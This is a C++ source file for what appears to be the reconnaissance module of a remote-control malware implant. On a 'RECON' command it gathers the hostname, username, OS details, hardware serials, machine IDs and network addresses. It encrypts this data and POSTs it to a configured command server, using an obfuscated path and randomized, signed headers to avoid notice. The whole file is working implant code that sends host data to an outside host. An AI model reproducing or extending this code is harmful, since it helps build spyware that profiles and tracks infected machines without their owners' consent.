#include "ReconModule.h"
#include "Globals.h"
#include "Crypto.h"
#include "Obfuscation.h"
#include <curl/curl.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <unistd.h>
#include <openssl/evp.h>
#include <chrono>
#include <ctime>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <pwd.h>
#ifdef _WIN32
#include <windows.h>
#endif

static std::string read_first_line(const std::string& path) {
    std::ifstream f(path);
    if(!f.is_open()) return {};
    std::string line; std::getline(f, line);
    return line;
}

nlohmann::json ReconModule::collect() {
    nlohmann::json j;
    char host[256];
    if(gethostname(host, sizeof(host))==0) j["hostname"] = host;
#ifdef _WIN32
    char user[256]; DWORD usz=256; if(GetUserNameA(user,&usz)) j["username"] = user;
    OSVERSIONINFOA vi{sizeof(vi)}; if(GetVersionExA(&vi)) {
        j["platform"] = "Windows";
        j["os_version"] = std::to_string(vi.dwMajorVersion) + "." + std::to_string(vi.dwMinorVersion);
    }
    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    j["arch"] = (si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)?"x64":"x86";
    j["boot_time"] = 0; j["uptime"] = GetTickCount64()/1000;
#else
    if(const char* u = getenv("USER")) j["username"] = u;
    struct utsname uts; if(uname(&uts)==0){ j["platform"] = uts.sysname; j["arch"] = uts.machine; j["kernel_version"] = uts.release; }
    struct sysinfo si; if(sysinfo(&si)==0){ j["boot_time"] = std::time(nullptr)-si.uptime; j["uptime"] = si.uptime; j["ram_total"] = si.totalram; j["ram_free"] = si.freeram; }
    std::ifstream cpu("/proc/cpuinfo");
    std::string line; while(std::getline(cpu,line)){ if(line.find("model name")!=std::string::npos){ auto pos=line.find(":"); if(pos!=std::string::npos){ j["cpu_model"] = line.substr(pos+2); break; } } }
    j["bios_serial"] = read_first_line("/sys/class/dmi/id/product_serial");
    j["board_serial"] = read_first_line("/sys/class/dmi/id/board_serial");
    j["system_uuid"] = read_first_line("/sys/class/dmi/id/product_uuid");
    j["machine_guid"] = read_first_line("/etc/machine-id");
#endif
    // network interfaces
    struct ifaddrs* ifs; if(getifaddrs(&ifs)==0){
        nlohmann::json arr = nlohmann::json::array();
        for(struct ifaddrs* i=ifs;i;i=i->ifa_next){ if(!i->ifa_addr) continue; nlohmann::json ni; ni["name"] = i->ifa_name; if(i->ifa_addr->sa_family==AF_INET){ char ip[INET_ADDRSTRLEN]; inet_ntop(AF_INET,&((struct sockaddr_in*)i->ifa_addr)->sin_addr,ip,sizeof(ip)); ni["ip"] = ip; } arr.push_back(ni); }
        freeifaddrs(ifs); j["interfaces"] = arr; }
    return j;
}

static std::string base64_encode(const unsigned char* data,size_t len){
    int out_len = 4*((len+2)/3); std::vector<unsigned char> out(out_len+1); EVP_EncodeBlock(out.data(), data, len); return std::string((char*)out.data(), out_len);
}

std::string ReconModule::encrypt_report(const std::string& js) {
    if(g_aes_key.empty()) return {};
    std::string iv(16,'\0');
    for(int i=0;i<16;++i) iv[i] = rand()%256;
    std::vector<unsigned char> data(js.begin(), js.end());
    auto enc = Crypto::encrypt(data, g_aes_key, iv);
    std::vector<unsigned char> blob(iv.begin(), iv.end());
    blob.insert(blob.end(), enc.begin(), enc.end());
    return base64_encode(blob.data(), blob.size());
}

void ReconModule::init() {
    register_command("RECON", [this](const nlohmann::json&){
        auto info = collect();
        std::string payload = info.dump();
        std::string enc = encrypt_report(payload);
        std::string url = g_agent_config.server_url + g_agent_config.path_prefix + OBFUSCATE("/recon/") + g_uuid;
        CURL* curl = curl_easy_init();
        if(!curl) return;
        struct curl_slist* headers = g_header_randomizer.build_list();
        std::string body = std::string("{\"data\":\"") + enc + "\"}";
        headers = g_request_signer.sign(headers, "POST", url, body);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
        curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    });
}

#ifndef STATIC_AGENT
extern "C" Module* create_module() { return new ReconModule(); }
#endif
